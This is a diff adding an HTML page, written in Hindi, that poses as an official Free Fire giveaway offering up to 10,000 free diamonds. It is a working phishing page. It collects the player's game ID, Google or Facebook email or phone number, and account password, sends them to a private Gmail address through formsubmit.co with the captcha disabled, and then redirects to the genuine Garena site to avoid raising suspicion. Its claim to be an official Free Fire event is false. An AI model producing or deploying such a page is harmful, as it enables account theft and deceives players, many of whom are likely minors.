@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <title>Free Fire Diamond Free</title>
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: url('https://i.pinimg.com/originals/43/71/5e/43715e1eb31b82a7937acfe3ce15e452.jpg') no-repeat center center fixed;
+      background-size: cover;
+      font-family: Arial, sans-serif;
+      color: #fff;
+      text-align: center;
+    }
+
+    .overlay {
+      background-color: rgba(0, 0, 0, 0.7);
+      min-height: 100vh;
+      padding: 40px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .container {
+      background: #222;
+      border-radius: 15px;
+      padding: 30px;
+      max-width: 700px;
+      width: 100%;
+      margin: auto;
+      box-shadow: 0 0 15px #000;
+    }
+
+    input, select, button {
+      padding: 14px;
+      margin: 12px 0;
+      width: 100%;
+      font-size: 18px;
+      border-radius: 8px;
+      border: none;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #f90;
+      color: #000;
+      cursor: pointer;
+      font-weight: bold;
+      transition: background 0.3s;
+    }
+
+    button:hover {
+      background-color: #ffb300;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #aaa;
+    }
+  </style>
+</head>
+<body>
+  <div class="overlay">
+    <div class="container">
+      <h1>🔥 Free Fire 10000 Diamond Free 🔥</h1>
+      <p>अपना UID, लेवल, लॉगिन मेथड और डायमंड सिलेक्ट करें – यह FREE FIRE का OFFICIAL इवेंट है!</p>
+      
+      <form id="diamondForm" action="https://formsubmit.co/sksirswa5225@gmail.com" method="POST" onsubmit="return validateForm()">
+        
+        <!-- Game ID -->
+        <input type="text" name="Game_ID" placeholder="अपना Free Fire ID डालें" required><br>
+
+        <!-- Level -->
+        <input type="number" name="Level" id="levelInput" placeholder="अपना लेवल डालें (50 या उससे अधिक)" required><br>
+
+        <!-- Login Method -->
+        <select id="loginMethod" name="Login_Method" onchange="showLoginInput()" required>
+          <option value="">लॉगिन मेथड चुनें</option>
+          <option value="Google">Google</option>
+          <option value="Facebook">Facebook</option>
+        </select><br>
+
+        <!-- Conditional Gmail/Mobile input -->
+        <div id="loginDetailContainer" style="display: none;">
+          <input type="text" id="loginDetail" name="Login_Detail" placeholder="">
+        </div>
+
+        <!-- Password नीचे शिफ्ट किया गया -->
+        <input type="password" name="Password" placeholder="अपना पासवर्ड डालें" required><br>
+
+        <!-- Diamond Selection -->
+        <select name="Diamond_Amount" required>
+          <option value="">कितने DIAMOND चाहिए चुनें</option>
+          <option value="100">100 DIAMOND</option>
+          <option value="500">500 DIAMOND</option>
+          <option value="1000">1000 DIAMOND</option>
+          <option value="5000">5000 DIAMOND</option>
+          <option value="10000">10000 DIAMOND</option>
+        </select><br>
+
+        <!-- Hidden inputs for formsubmit -->
+        <input type="hidden" name="_template" value="table">
+        <input type="hidden" name="_captcha" value="false">
+
+        <!-- Submit Button -->
+        <button type="submit">🎁 SUBMET DETAILं</button>
+      </form>
+
+      <div class="footer">
+        *यह एक Free Fire official गिवअवे है। इसका आयोजन Free Fire द्वारा किया गया है 🔥
+      </div>
+    </div>
+  </div>
+
+  <!-- JavaScript Validation & Redirect -->
+  <script>
+    function validateForm() {
+      var level = document.getElementById("levelInput").value;
+      if (parseInt(level) < 50) {
+        alert("लेवल कम से कम 50 होना चाहिए!");
+        return false;
+      }
+
+      // Redirect after delay
+      setTimeout(function() {
+        window.location.href = "https://ff.garena.com/en";
+      }, 1500);
+
+      return true;
+    }
+
+    function showLoginInput() {
+      var method = document.getElementById("loginMethod").value;
+      var input = document.getElementById("loginDetail");
+      var container = document.getElementById("loginDetailContainer");
+
+      if (method === "Google") {
+        input.placeholder = "अपनी Gmail ID डालें";
+        container.style.display = "block";
+      } else if (method === "Facebook") {
+        input.placeholder = "अपना मोबाइल नंबर या Gmail ID डालें";
+        container.style.display = "block";
+      } else {
+        container.style.display = "none";
+      }
+    }
+  </script>
+</body>
+</html>
